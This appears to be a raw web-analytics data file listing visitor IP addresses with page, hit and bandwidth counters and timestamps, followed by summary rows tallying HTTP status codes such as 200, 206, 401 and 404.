5	1	1	0	0	26200199	0	0	26200199	0	0	511	54.190.243.198
5	1	1	0	0	26077635	0	0	26077635	0	0	376	34.210.82.132
5	1	1	0	0	26119513	0	0	26119513	0	0	511	54.187.57.215
5	1	1	0	0	26009879	0	0	26009879	0	0	376	54.186.244.230
5	1	1	0	0	26136917	0	0	26136917	0	0	511	52.39.169.164
5	1	1	0	0	26070730	0	0	26070730	0	0	376	34.214.238.185
5	2	0	0	0	26278290	0	0	26278290	0	0	70839	185.50.251.15
5	1	1	0	0	26088050	0	0	26088050	0	0	511	35.163.112.97
5	1	1	0	0	26198809	0	0	26198809	0	0	511	54.190.102.241
5	1	1	0	0	26154664	0	0	26154664	0	0	511	34.220.102.60
5	1	1	0	0	26224336	0	0	26224336	0	0	511	34.221.46.51
5	1	1	0	0	26346617	0	0	26346617	0	0	938	18.237.222.25
5	1	1	0	0	26116482	0	0	26116482	0	0	511	209.17.97.122
5	1	1	0	0	26186961	0	0	26186961	0	0	511	54.186.65.211
5	1	1	0	0	26355479	0	0	26355479	0	0	938	38.145.98.7
5	1	1	0	0	26046016	0	0	26046016	0	0	376	35.167.197.213
5	3	3	0	0	26228361	0	0	26223072	0	0	80305	195.154.61.206
5	1	1	0	0	26195837	0	0	26195837	0	0	0	159.203.17.35
5	1	1	0	0	26014394	0	0	26014394	0	0	376	54.185.241.239
5	2	2	0	0	26141657	0	0	26077427	0	0	887	209.17.97.106
5	1	1	0	0	26288104	0	0	26288104	0	0	511	163.172.154.242
5	1	1	0	0	26201682	0	0	26201682	0	0	511	34.219.98.172
5	1	1	0	0	26097822	0	0	26097822	0	0	511	66.249.137.142
5	1	1	0	0	26111532	0	0	26111532	0	0	511	188.165.192.220
5	1	1	0	0	26307055	0	0	26307055	0	0	39909	157.245.13.144
5	1	1	0	0	26148733	0	0	26148733	0	0	511	34.221.120.184
5	2	2	0	0	26355404	0	0	26355404	0	0	1876	179.43.169.182
5	1	1	0	5	26071332	0	26071332	26071332	0	26071332	376	195.114.211.98
5	1	1	0	0	26018592	0	0	26018592	0	0	376	52.42.26.174
5	2	2	0	0	26282944	0	0	26282944	0	0	1022	167.71.183.238
5	2	2	0	21	26171811	0	26171812	26171811	0	26171811	1022	142.44.151.107
5	0	0	0	15	0	0	26276726	0	0	26276726	0	23.92.127.2
5	1	1	0	0	26110908	0	0	26110908	0	0	511	34.210.217.134
5	0	0	0	1	0	0	26353069	0	0	26353069	0	62.210.10.77
5	27	27	0	0	26352681	0	0	26232125	0	0	0	52.41.211.72
5	5	5	0	42	26039862	0	26039862	26039862	0	26039861	1880	167.114.191.196
5	0	0	0	1	0	0	26278282	0	0	26278282	0	96.44.186.54
5	1	1	0	0	26233030	0	0	26233030	0	0	511	52.26.119.218
5	1	1	0	0	26214698	0	0	26214698	0	0	511	157.245.210.253
5	1	1	0	0	25983895	0	0	25983895	0	0	97	54.191.135.142
5	1	1	0	0	26179567	0	0	26179567	0	0	511	52.34.173.58
5	1	1	0	0	26061702	0	0	26061702	0	0	376	54.187.142.129
5	1	1	0	0	26123351	0	0	26123351	0	0	511	34.221.125.102
5	1	1	0	0	26135440	0	0	26135440	0	0	511	34.214.103.129
5	1	1	0	0	26204532	0	0	26204532	0	0	511	35.162.190.56
5	4	4	0	2	26234859	0	26228408	25979487	0	26223095	1630	62.4.14.198
5	1	1	0	0	26177234	0	0	26177234	0	0	511	34.220.222.145
5	3	3	0	0	26228406	0	0	26099471	0	0	1533	62.4.14.206
5	1	1	0	0	26054640	0	0	26054640	0	0	376	52.43.165.77
5	0	0	0	2	0	0	26142083	0	0	26141305	0	185.234.217.41
5	0	0	0	6	0	0	26343223	0	0	26343223	0	185.234.219.182
5	1	1	0	0	26221648	0	0	26221648	0	0	511	18.237.78.27
5	1	1	0	0	26085024	0	0	26085024	0	0	511	54.244.203.66
5	2	2	0	0	26180543	0	0	26180542	0	0	1022	31.207.33.10
5	1	1	0	0	26004113	0	0	26004113	0	0	376	52.39.43.0
5	1	1	0	0	26185488	0	0	26185488	0	0	511	34.216.138.95
5	9	9	0	67	26185225	0	26185225	26185215	0	26185215	4599	87.98.175.135
5	1	1	0	0	26187144	0	0	26187144	0	0	511	34.215.203.70
5	1	1	0	0	26157877	0	0	26157877	0	0	511	54.189.20.220
5	6	0	0	0	26083929	0	0	25978799	0	0	203472	98.156.225.224
5	1	1	0	0	26056176	0	0	26056176	0	0	376	52.37.125.23
5	0	0	0	3	0	0	26348150	0	0	26248075	0	66.249.64.97
5	1	1	0	0	26313465	0	0	26313465	0	0	780	34.217.121.138
5	1	1	0	0	26346469	0	0	26346469	0	0	39909	165.227.122.164
5	1	1	0	0	26215761	0	0	26215761	0	0	511	34.210.93.8
5	1	1	0	0	26220359	0	0	26220359	0	0	511	54.214.182.243
5	1	0	0	0	26278290	0	0	26278290	0	0	39970	64.119.195.186
5	0	0	0	1	0	0	26340276	0	0	26340276	0	45.55.44.77
5	1	1	0	0	26175762	0	0	26175762	0	0	511	34.220.240.86
5	0	0	0	22	0	0	26160327	0	0	25980299	0	66.249.64.82
5	0	0	0	32	0	0	26165752	0	0	25980299	0	66.249.64.80
5	0	0	0	3	0	0	26187349	0	0	26015730	0	66.249.75.5
5	0	0	0	28	0	0	26165752	0	0	26002768	0	66.249.64.78
5	1	1	0	20	26110807	0	26110810	26110807	0	26110805	511	46.101.231.153
5	0	0	0	2	0	0	26117317	0	0	26015730	0	66.249.75.3
5	0	0	0	2	0	0	26278280	0	0	26278280	0	46.148.120.251
5	0	0	0	1	0	0	26278284	0	0	26278284	0	115.84.91.131
5	1	1	0	0	26088147	0	0	26088147	0	0	511	38.145.113.85
z	0	94	94	26358529	0
z	2	10	10	25983895	970
z	3	689	689	26359429	352537
z	5	106	64	26359408	3885151
c	200	845	26359429
c	206	54	26185225
c	401	128	26359341
c	404	873	26357602
